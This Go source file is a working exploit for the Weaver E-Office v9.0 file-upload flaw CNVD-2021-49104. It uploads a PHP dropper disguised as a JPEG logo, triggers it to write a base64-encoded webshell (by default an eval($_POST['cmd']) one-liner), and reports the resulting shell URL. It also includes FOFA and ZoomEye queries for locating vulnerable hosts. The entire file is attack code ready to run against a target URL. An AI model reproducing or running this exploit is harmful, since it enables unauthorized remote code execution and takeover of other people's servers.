package main

/**
* 泛微E-Office v9.0 exp  CNVD-2021-49104
* @Author: rootk1t
* @Date: 2021-12-02
 */

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

var (
	target        string
	file          string
	shellName     string
	WarnOutput    *color.Color = color.New(color.FgRed, color.Bold)
	SuccessOutput *color.Color = color.New(color.FgGreen, color.Bold)
)

func init() {
	flag.StringVar(&target, "url", "", "目标地址")
	flag.StringVar(&file, "file", "", "需要上传输的文件")
	flag.Parse()
}

func main() {
	poc()
}

func poc() {
	/*
		fofa语法：app="泛微-EOffice"
		zoomeye: app:"泛微协同办公标准产品EOffice"
	*/
	client := createHttpClient()
	targetUrl := getUrl()
	payload := getPayload()

	//构造multipart
	body := &bytes.Buffer{}
	fmt.Println(payload)
	writer := multipart.NewWriter(body)
	w, _ := createImageFormFile(writer, "test.php")
	w.Write([]byte(payload))
	w.Write([]byte("\n\n--" + writer.Boundary() + "--"))
	defer writer.Close()

	req, _ := http.NewRequest("POST", targetUrl, body)
	req.Header.Add("Content-Type", "multipart/form-data; boundary="+writer.Boundary())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0")
	req.Header.Set("Accept-Language", "zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln("请求出错", err.Error())
	}
	defer resp.Body.Close()

	data, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(data))
	if strings.Contains(string(data), "logo-eoffice.php") {
		checkUploadFile(shellName)
	}

}

func createImageFormFile(w *multipart.Writer, filename string) (io.Writer, error) {
	//设置multipart的content-type为image/jpeg，不然会自动根据body来确定.
	mime := make(textproto.MIMEHeader)
	mime.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, "Filedata", "shell.php"))
	mime.Set("Content-Type", "image/jpeg")
	return w.CreatePart(mime)
}

func createHttpClient() *http.Client {
	//uri, _ := url.Parse("http://127.0.0.1:8080") //代理到burp进行调试

	httpclient := &http.Client{
		Timeout: time.Duration(time.Second * 10),
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			//Proxy: http.ProxyURL(uri),
		},
	}
	return httpclient
}

func getUrl() string {
	path := "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
	if target == "" {
		log.Fatalln("没有指定目标")
	}
	target = strings.TrimSuffix(target, "/")
	return target + path
}

func getPayload() string {
	evilCode := "<?php @eval($_POST[\"cmd\"]);?>"

	if file == "" {
		//没有指定文件，尝试写入一句话
		WarnOutput.Println("未指定文件，使用以下payload")
		fmt.Println(evilCode)
	} else {
		f, err := os.Open(file)
		if err != nil {
			log.Fatalln("打开文件错误....")
		}
		defer f.Close()

		data, err := ioutil.ReadAll(f)
		if err != nil {
			log.Fatalln("读取文件错误...")
		}
		evilCode = string(data)
	}

	shellName = getRandString(10) + ".php"                         //利用随机字符作文件名，避免冲突
	evilCode = base64.StdEncoding.EncodeToString([]byte(evilCode)) //写php代码时最好用base64，不然会出现一些问题。
	return fmt.Sprintf("<?php $f=fopen(\"%s\", \"w\");$d='%s';fwrite($f, base64_decode($d));fclose($f);?>", shellName, evilCode)

}

func getRandString(len int) string {

	if len <= 0 {
		len = 10
	}

	bytes := make([]byte, len)

	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < len; i++ {
		b := r.Intn(26) + 97
		bytes[i] = byte(b)
	}
	return string(bytes)
}

func checkUploadFile(sn string) {
	path := "/images/logo/"
	client := createHttpClient()
	shellUrl := target + path + "logo-eoffice.php"
	resp, err := client.Post(shellUrl, "Content-Type: text/html", nil)
	if err != nil {
		WarnOutput.Print("利用失败")
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		//如果存在logo-eoffice.php并请求一次，执行写文件payload
		webshell := target + path + sn
		req, _ := http.NewRequest("GET", webshell, nil)
		resp, err := client.Do(req)
		if err != nil {
			WarnOutput.Print("写入webshell失败")
			return
		}
		defer resp.Body.Close()

		fmt.Println(resp.StatusCode)

		if resp.StatusCode == http.StatusOK {
			SuccessOutput.Println("利用成功, webshell地址：", webshell)
		}
		return
	}

	WarnOutput.Print("利用失败")
}
